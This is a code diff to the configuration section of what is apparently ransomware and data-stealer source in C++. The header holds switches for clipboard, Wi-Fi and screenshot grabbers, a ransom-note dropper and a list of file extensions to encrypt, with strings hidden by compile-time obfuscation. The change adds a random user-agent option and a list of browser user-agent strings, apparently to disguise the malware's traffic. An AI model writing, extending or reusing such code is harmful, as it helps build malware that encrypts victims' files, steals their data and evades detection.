@@ -58,6 +58,7 @@
 #define GET_CLIPBOARD		true	// enable or disable clipboard grabber
 #define GET_WIFI			true	// enable or disable wifi grabber
 #define GET_SCREENSHOT		true	// enable or disable screenshot grabber
+#define RANDOM_USERAGENT	true	// enable or disable random user agent (if false it uses the first one)
 #define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
 #define DROP_README			false	// enable or disable README dropper
@@ -180,6 +181,20 @@ const std::string whitelist[] = {
 	(std::string)skCrypt("bin")
 }; // extension of files to encrypt
 
+const std::string userAgents[] = {
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/106.0.1370.52"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.14"),
+	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.72")
+};
 
 
 typedef unsigned char BYTE;
